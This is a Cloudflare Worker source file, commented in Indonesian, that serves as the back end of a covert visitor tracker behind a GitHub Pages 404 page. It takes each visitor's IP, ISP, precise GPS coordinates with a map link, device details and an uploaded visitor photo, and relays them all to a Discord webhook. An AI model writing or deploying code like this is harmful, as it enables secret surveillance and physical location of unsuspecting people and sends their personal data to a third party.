/**
 * Cloudflare Worker — Isekai Discord Notifier
 * Menerima dua jenis POST dari 404.html:
 *   type "data"  → JSON payload lengkap → kirim embed ke Discord
 *   type "photo" → multipart dengan foto → kirim foto sebagai follow-up
 *
 * DISCORD_WEBHOOK_URL disimpan sebagai Worker Secret (tidak pernah ke browser).
 */

/* Izinkan hanya dari GitHub Pages site ini */
const ALLOWED_ORIGIN = "https://yumelyrics.github.io";

const CORS = {
  "Access-Control-Allow-Origin":  ALLOWED_ORIGIN,
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

/* Sanitize — buang karakter kontrol, potong panjang */
function s(v, max = 200) {
  if (v == null || v === "") return "—";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
}

function waktuWIB() {
  try {
    return new Date().toLocaleString("id-ID", {
      timeZone:  "Asia/Jakarta",
      day:       "2-digit",
      month:     "long",
      year:      "numeric",
      hour:      "2-digit",
      minute:    "2-digit",
      second:    "2-digit",
    }) + " WIB";
  } catch (_) {
    return new Date().toISOString();
  }
}

function buildDataEmbed(data) {
  const ip       = s(data.ip, 45);
  const isp      = s(data.isp);
  const lokasiIP = s(data.lokasi);
  const tz       = s(data.timezone, 60);
  const platform = s(data.platform, 60);
  const lang     = s(data.language, 20);
  const res      = `${s(data.screenW, 8)}×${s(data.screenH, 8)} (${s(data.pixelRatio, 4)}×)`;
  const url      = s(data.url, 512);
  const ref      = data.referrer ? s(data.referrer, 300) : null;
  const ua       = s(data.userAgent, 180);

  /* GPS — buat link Google Maps kalau tersedia */
  let gpsValue = "—";
  const lat = parseFloat(data.gpsLat);
  const lon = parseFloat(data.gpsLon);
  const acc = parseInt(data.gpsAcc, 10);
  if (!isNaN(lat) && !isNaN(lon)) {
    const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
    gpsValue = `[${lat.toFixed(5)}, ${lon.toFixed(5)}](${mapsUrl})` +
               (!isNaN(acc) ? ` ±${acc}m` : "");
  }

  const fields = [
    { name: "🌐 IP",          value: `\`${ip}\``, inline: true  },
    { name: "🏢 ISP",         value: isp,          inline: true  },
    { name: "🕐 Timezone",    value: tz,            inline: true  },
    { name: "📍 Lokasi (IP)", value: lokasiIP,      inline: true  },
    { name: "📡 GPS Tepat",   value: gpsValue,      inline: true  },
    { name: "🌍 Bahasa",      value: lang,          inline: true  },
    { name: "💻 Platform",    value: platform,      inline: true  },
    { name: "🖥️ Resolusi",    value: res,           inline: true  },
    { name: "\u200b",         value: "\u200b",      inline: true  }, // spacer row
    { name: "🔗 URL",         value: url,           inline: false },
  ];

  if (ref) {
    fields.push({ name: "↩️ Referrer", value: ref, inline: false });
  }

  fields.push({
    name:   "📱 User Agent",
    value:  `\`\`\`${ua}\`\`\``,
    inline: false,
  });

  return {
    color:  0xFF6FB0,
    author: { name: "🌸 Pengunjung Tersesat Terdeteksi!" },
    fields,
    footer: { text: `Isekai Guild 🎴 • ${waktuWIB()}` },
  };
}

async function postToDiscord(webhookUrl, init) {
  const res = await fetch(webhookUrl, init);
  if (!res.ok) {
    console.error("Discord error:", res.status, await res.text().catch(() => ""));
  }
}

export default {
  async fetch(request, env) {
    /* CORS preflight */
    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: CORS });
    }

    if (request.method !== "POST") {
      return new Response("Method Not Allowed", { status: 405, headers: CORS });
    }

    /* Tolak origin yang bukan GitHub Pages ini */
    const origin = request.headers.get("Origin") || "";
    if (!origin.includes("yumelyrics.github.io")) {
      return new Response("Forbidden", { status: 403, headers: CORS });
    }

    const webhookUrl = env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
      return new Response("OK (no webhook configured)", { status: 200, headers: CORS });
    }

    const ct = request.headers.get("Content-Type") || "";

    /* ── Type: data (JSON) ──────────────────────────────────────────── */
    if (ct.includes("application/json")) {
      let data;
      try { data = await request.json(); }
      catch { return new Response("Invalid JSON", { status: 400, headers: CORS }); }

      const embed = buildDataEmbed(data);
      try {
        await postToDiscord(webhookUrl, {
          method:  "POST",
          headers: { "Content-Type": "application/json" },
          body:    JSON.stringify({ username: "Isekai Guild 🎴", embeds: [embed] }),
        });
      } catch (err) { console.error(err); }

      return new Response("OK", { status: 200, headers: CORS });
    }

    /* ── Type: photo (multipart) ───────────────────────────────────── */
    if (ct.includes("multipart/form-data")) {
      let form;
      try { form = await request.formData(); }
      catch { return new Response("Invalid multipart", { status: 400, headers: CORS }); }

      const photoFile = form.get("photo");
      if (!photoFile) {
        return new Response("No photo", { status: 400, headers: CORS });
      }

      try {
        const df = new FormData();
        df.append(
          "payload_json",
          JSON.stringify({
            username: "Isekai Guild 🎴",
            content:  "📸 **Foto pengunjung tersesat:**",
          })
        );
        df.append("files[0]", photoFile, "visitor.jpg");
        await postToDiscord(webhookUrl, { method: "POST", body: df });
      } catch (err) { console.error(err); }

      return new Response("OK", { status: 200, headers: CORS });
    }

    return new Response("Bad Request", { status: 400, headers: CORS });
  },
};
